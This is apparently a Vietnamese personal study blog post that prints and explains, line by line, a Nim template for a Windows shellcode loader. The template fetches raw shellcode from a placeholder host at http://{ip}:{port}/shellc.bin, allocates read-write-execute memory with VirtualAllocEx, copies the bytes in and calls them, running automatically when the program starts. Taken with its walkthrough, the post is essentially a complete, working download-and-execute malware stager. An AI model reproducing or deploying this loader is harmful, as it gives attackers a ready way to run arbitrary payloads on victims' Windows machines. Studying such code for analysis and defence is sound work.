---
title: Learn && Learn - Tìm hiểu về NIM_TEMPLATE
published: 2026-06-26
description: Blog này là note lúc mình tìm hiểu về NIM_TEMPLATE.
image: "./nim.png"
tags: [learning]
category: Learn && Learn
draft: false
---

# Tìm hiểu flow làm việc của `NIM_TEMPLATE`

---

```
NIM_TEMPLATE = """
import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {{.inline.}} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {{.nimcall.}}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://{ip}:{port}/shellc.bin")
"""
```

---

## 1. Chi tiết về `NIM_TEMPLATE`

`NIM_TEMPLATE` gồm hai phần chính:

1. hàm chuyển đổi dữ liệu thành byte,
2. hàm tải về và chạy dwx liệu đó.

### 1.1. Thư viện cần dùng

```nim
import winim/lean
import httpclient
```

- `import winim/lean`: thư viện hỗ trợ gọi API Windows.
- `import httpclient`: thư viện để tải dữ liệu từ Internet.

### 1.2. Chuyển dữ liệu thành dãy byte

```nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))
```

- `func toByteSeq*(str: string): seq[byte]`: hàm nhận chuỗi ký tự và trả về dãy byte.
- `@(... )`: đánh dấu thành một dãy byte.
- `str.toOpenArrayByte(0, str.high)`: lấy từng ký tự trong chuỗi và chuyển thành giá trị số.

Note: Tức là hàm này biến một chuỗi văn bản thành mảng dữ liệu nhị phân.

### 1.3. Tải dữ liệu từ URL

```nim
proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)
```

- `proc DownloadExecute(url: string)`: định nghĩa procedure gọi là `DownloadExecute`.
- `newHttpClient()`: tạo một máy khách để kết nối Internet.
- `client.getContent(url)`: lấy nội dung từ địa chỉ web.

### 1.4. Biến nội dung đó thành byte

```nim
  var shellcode: seq[byte] = toByteSeq(response)
```

- `shellcode` ở đây là tên biến chứa dữ liệu đã tải.
- Chương trình không hiểu nội dung đó là gì, nó chỉ biến nó thành dãy byte.

Note: Chương trình không giải mã hay kiểm tra nội dung mà nó chỉ chuẩn bị để chạy trực tiếp.

### 1.5. Mở tiến trình hiện tại

```nim
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)
```

- `GetCurrentProcessId()`: lấy ID của tiến trình đang chạy.
- `OpenProcess(...)`: mở quyền truy cập vào tiến trình này.
- `defer: CloseHandle(pHandle)`: handle sẽ bị đóng sau khi xong.

Note: Chương trình mở chính nó để có thể thao tác bộ nhớ.

### 1.6. Cấp vùng nhớ để  có thể chạy được

```nim
  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
```

- `VirtualAllocEx(...)`: cấp một vùng nhớ trong tiến trình.
- `len(shellcode)`: kích thước cần cấp bằng độ dài dữ liệu tải về.
- `0x3000`: là giá trị nhị phân cho `MEM_RESERVE | MEM_COMMIT`.
  - `MEM_RESERVE` = 0x2000: đặt trước vùng nhớ.
  - `MEM_COMMIT` = 0x1000: cấp bộ nhớ vật lý cho vùng đó.
- `PAGE_EXECUTE_READ_WRITE`: cho phép vùng này vừa ghi được vừa chạy được.

`0x3000` được chọn để Windows cả cấp và dự trữ vùng nhớ ngay lập tức, nên sau đó chương trình có thể sao chép dữ liệu vào và chạy luôn.

Note: Đây là phần nhạy cảm khi cho phép ghi dữ liệu vào bộ nhớ và chạy dữ liệu đó.

### 1.7. Sao chép dữ liệu vào vùng nhớ

```nim
  copyMem(rPtr, addr shellcode[0], len(shellcode))
```

- `copyMem(...)`: sao chép các byte từ biến `shellcode` vào vùng nhớ mới cấp.
- `addr shellcode[0]`: lấy địa chỉ bắt đầu của dãy byte.

Note: Kiểu như paste nội dung đã tải vào vùng nhớ có thể thực thi.

### 1.8. Chuyển vùng nhớ thành lệnh và thực thi

```nim
  let f = cast[proc() {.nimcall.}}](rPtr)
  f()
```

- `cast[proc() {.nimcall.}}](rPtr)`: nói với trình biên dịch rằng `rPtr` là địa chỉ của một hàm.
- `f()`: gọi hàm này, tức là nhảy vào vùng nhớ và chạy dữ liệu.

Note: Dữ liệu bây giờ được xem như một chương trình nhỏ, và `f()` thực hiện nó.

### 1.9. Phần autorun trên Windows

```nim
when defined(windows):
  when isMainModule:
    DownloadExecute("http://{ip}:{port}/shellc.bin")
```

- `when defined(windows)`: chỉ thực hiện phần này trên Windows.
- `when isMainModule`: chỉ chạy khi chương trình chính được chạy trực tiếp.
- `DownloadExecute(...)`: gọi hàm tải dữ liệu từ `http://<IP>:<PORT>/shellc.bin`.
